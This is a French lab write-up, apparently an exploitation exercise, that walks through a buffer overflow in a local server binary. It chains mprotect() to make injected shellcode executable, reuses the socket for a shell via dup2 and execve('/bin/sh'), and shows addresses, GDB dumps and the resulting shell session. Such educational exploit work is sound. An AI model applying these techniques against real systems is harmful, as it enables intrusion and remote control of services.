# Exercice 2 — Suite : nouvelle méthode d’exploitation

## 1. Introduction

Cette partie constitue la suite de l'exploitation réalisée précédemment sur l'Exercice 2.

Une première méthode avait permis de détourner le flot d'exécution afin d'appeler `system()` et d'obtenir un shell. Nous allons ici mettre en œuvre une seconde méthode, sans modifier le principe général de l'exploitation, mais en utilisant directement du **shellcode injecté dans le programme**.

L'objectif est donc de :

* placer le shellcode dans la variable `username` ;
* rendre la zone mémoire contenant cette variable exécutable avec `mprotect()` ;
* détourner le retour de la fonction vers cette zone ;
* exécuter le shellcode ;
* utiliser le socket existant comme entrée/sortie du shell.

---

## 2. Principe de la nouvelle exploitation

Contrairement à la première méthode, nous n'appelons plus directement `system()`.

Le principe est désormais le suivant :

```text
        Buffer overflow
              │
              ▼
       mprotect(page(username),
                0x1000, 7)
              │
              ▼
       username[] devient
       lisible/écrivable/exécutable
              │
              ▼
       Retour vers username[]
              │
              ▼
          Shellcode
              │
              ├── dup2(4, 0)
              ├── dup2(4, 1)
              ├── dup2(4, 2)
              │
              ▼
          execve("/bin/sh")
```

Le descripteur `4` correspond au socket utilisé par le programme. Le shellcode redirige donc l'entrée standard, la sortie standard et la sortie d'erreur vers ce socket avant de lancer `/bin/sh`.

---

## 3. Localisation de `username`

La variable `username` est toujours utilisée comme zone permettant de stocker des données contrôlées par l'utilisateur.

Avec :

```bash
readelf -sW ./exo2 | grep username
```

on obtient notamment :

```text
username    0x4040
```

Avec la base PIE obtenue lors de l'exécution :

```text
PIE base = 0x56639000
```

l'adresse réelle de `username` est :

```text
0x56639000 + 0x4040 = 0x5663d040
```

La page mémoire correspondante commence donc à :

```text
0x5663d000
```

Cette adresse de page est celle qui sera utilisée comme premier argument de `mprotect()`.

---

## 4. Utilisation de `mprotect()`

Pour pouvoir exécuter le shellcode placé dans `username`, il faut d'abord modifier les permissions de la page mémoire.

L'appel utilisé est :

```c
mprotect(0x5663d000, 0x1000, 7);
```

avec :

* `0x5663d000` : adresse de début de la page ;
* `0x1000` : taille d'une page mémoire ;
* `7` : permissions `PROT_READ | PROT_WRITE | PROT_EXEC`.

L'adresse de `mprotect()` a été déterminée dans la libc :

```text
mprotect = 0xf7d1c5b0
```

L'appel est donc intégré dans la chaîne de retour de l'exploitation.

---

## 5. Vérification avec GDB

L'appel à `mprotect()` a été vérifié directement avec GDB.

À l'entrée de `mprotect()`, la pile contient :

```text
0xfff654b0: 0x5663d040    ← adresse de retour
0xfff654b4: 0x5663d000    ← adresse de la page
0xfff654b8: 0x00001000    ← taille
0xfff654bc: 0x00000007    ← permissions
```

Les registres utilisés par le wrapper correspondent alors aux arguments du syscall :

```text
EBX = 0x5663d000
ECX = 0x00001000
EDX = 0x00000007
EAX = 0x0000007d
```

Après l'exécution du syscall, `EAX` vaut `0`, ce qui indique que l'appel s'est correctement déroulé.

La mémoire a ensuite été vérifiée avec :

```bash
info proc mappings
```

La page contenant `username` apparaît alors avec les permissions :

```text
rwxp
```

La zone mémoire est donc bien devenue exécutable.

---

## 6. Exécution du shellcode

Une fois `mprotect()` exécuté, l'adresse de retour utilisée dans la chaîne est celle de `username` :

```text
0x5663d040
```

Le processeur commence alors à interpréter les octets présents dans cette zone comme des instructions.

Le shellcode fourni permet de réaliser deux opérations principales.

### Redirection du socket

Le shellcode effectue successivement :

```asm
dup2(4, 0)
dup2(4, 1)
dup2(4, 2)
```

Le descripteur du socket est ainsi dupliqué vers :

* `stdin` (`0`) ;
* `stdout` (`1`) ;
* `stderr` (`2`).

Le shell lancé ensuite utilise donc directement la connexion déjà établie avec le serveur.

### Lancement du shell

Le shellcode termine par un appel système `execve` avec :

```text
/bin/sh
```

Le processus courant est alors remplacé par un shell.

---

## 7. Adaptation de l'exploit

Contrairement à la première méthode, aucun nouveau listener n'est nécessaire.

Le script d'exploitation conserve simplement le socket déjà établi avec :

```text
127.0.0.1:55555
```

Le fonctionnement devient :

```text
Client
  │
  │ connexion
  ▼
Serveur
  │
  │ PING + overflow
  ▼
mprotect()
  │
  ▼
shellcode
  │
  ▼
/bin/sh
  │
  ▼
socket existant
```

Il est donc nécessaire de conserver la connexion ouverte après l'envoi du payload afin de pouvoir interagir avec le shell.

---

## 8. Validation de l'exploitation

L'exploitation a finalement été exécutée avec succès.

Après l'envoi du payload, un shell est obtenu :

```text
[+] Payload envoye

[+] Shell lance.
[+] Socket conserve pour stdin/stdout/stderr.
[+] Tape une commande.
$ ls
Makefile
exo2
exo2.c
```

La commande `cd ..` permet également de vérifier que l'on interagit bien avec un shell fonctionnel :

```text
$ cd ..
$ ls
README.md
Week1
Week2
Week4
week2
```

Ces résultats confirment que le shellcode a bien été exécuté et que les entrées/sorties du shell sont correctement redirigées vers le socket.

---

## 9. Comparaison avec la première méthode

Cette seconde méthode repose sur le même overflow que l'exploitation précédente, mais le contrôle du flot d'exécution est utilisé différemment.

| Première méthode                              | Nouvelle méthode                                               |
| --------------------------------------------- | -------------------------------------------------------------- |
| Appel de `system()`                           | Exécution de shellcode                                         |
| Utilisation directe d'une fonction de la libc | Utilisation de `mprotect()` puis exécution de code injecté     |
| Shell obtenu via `system()`                   | Shell obtenu via `execve("/bin/sh")`                           |
| Pas de code injecté à exécuter                | Shellcode placé dans `username`                                |
| Dépendance à l'adresse de `system()`          | Dépendance à l'adresse de `mprotect()` et à la zone `username` |

Cette seconde approche permet donc de montrer qu'il est possible d'exploiter le même débordement de tampon en injectant directement du code dans une zone mémoire contrôlée par l'utilisateur, après avoir modifié ses permissions d'exécution.
